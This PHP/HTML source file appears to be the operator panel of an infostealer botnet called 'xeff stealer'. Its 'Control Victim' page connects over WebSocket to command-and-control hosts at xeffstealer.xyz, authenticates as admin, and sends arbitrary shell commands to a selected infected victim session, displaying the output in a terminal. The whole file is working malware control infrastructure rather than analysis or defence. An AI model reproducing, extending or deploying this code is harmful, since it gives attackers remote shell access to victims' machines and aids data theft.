<?php
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

if (empty($_GET['session'])) {
    header("Location: active_victims.php");
    exit;
}

$sessionId = $_GET['session'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Victim - <?= sanitize($sessionId) ?></title>
    <link rel="stylesheet" href="css/monopo-fonts.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap">
    <link rel="stylesheet" href="design-system.css">
    <link rel="stylesheet" href="css/monopo-skin.css">
    <link rel="stylesheet" href="xeff/css/elite.css">
</head>
<body class="monopo-dark-theme">
    <?php include 'xeff/includes/navbar.php'; ?>
    <div class="main-content" style="max-width: 900px; margin: 40px auto; color: white;">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
            <h1>Active Shell: <span style="color:#10b981; font-family:monospace; font-size: 18px;"><?= sanitize($sessionId) ?></span></h1>
            <span id="wsStatus" style="color: #ef4444; font-weight: 600;">Disconnected</span>
        </div>
        
        <div class="terminal" id="terminalBox">
            <div class="terminal-line">[*] Connecting to C2 WebSockets...</div>
        </div>
        
        <input type="text" id="cmdInput" class="cmd-input" placeholder="Enter command (e.g., sysinfo, dir, whoami)..." disabled autocomplete="off">
    </div>

    <script>
        const SESSION_ID = <?= json_encode($sessionId) ?>;
        const C2_URLS = [
            "wss://xeffstealer.xyz/panel/", 
            "wss://c2.xeffstealer.xyz/panel"
        ];
        let ws = null;
        let urlIdx = 0;
        
        const term = document.getElementById('terminalBox');
        const cmdInput = document.getElementById('cmdInput');
        const wsStatus = document.getElementById('wsStatus');
        
        function logTerm(text, type = 'info') {
            const div = document.createElement('div');
            div.className = 'terminal-line ' + type;
            div.textContent = text;
            term.appendChild(div);
            term.scrollTop = term.scrollHeight;
        }

        function connectWs() {
            if (urlIdx >= C2_URLS.length) urlIdx = 0;
            try {
                ws = new WebSocket(C2_URLS[urlIdx]);
                ws.onopen = () => {
                    wsStatus.textContent = 'Connected';
                    wsStatus.style.color = '#10b981';
                    cmdInput.disabled = false;
                    cmdInput.focus();
                    logTerm('[+] WebSocket connected. Authenticating as admin...', 'cmd');
                    ws.send(JSON.stringify({ type: 'auth', role: 'admin' }));
                };
                
                ws.onmessage = (e) => {
                    try {
                        const data = JSON.parse(e.data);
                        if (data.type === 'cmd_response' && data.session_id === SESSION_ID) {
                            logTerm(data.output || '[No output]');
                        } else if (data.type === 'auth_success') {
                            logTerm('[+] Ready. Shell established to ' + SESSION_ID, 'cmd');
                        }
                    } catch(err) {}
                };
                
                ws.onclose = () => {
                    wsStatus.textContent = 'Disconnected';
                    wsStatus.style.color = '#ef4444';
                    cmdInput.disabled = true;
                    logTerm('[-] Connection lost. Reconnecting...', 'err');
                    urlIdx = (urlIdx + 1) % C2_URLS.length;
                    setTimeout(connectWs, 3000);
                };
                
                ws.onerror = () => {
                    try { ws.close(); } catch(e) {}
                };
            } catch(e) {
                urlIdx = (urlIdx + 1) % C2_URLS.length;
                setTimeout(connectWs, 3000);
            }
        }
        
        cmdInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && this.value.trim() !== '') {
                const cmd = this.value.trim();
                logTerm('> ' + cmd, 'cmd');
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: 'send_cmd',
                        target_session: SESSION_ID,
                        command: cmd
                    }));
                }
                this.value = '';
            }
        });

        connectWs();
    </script>
</body>
</html>
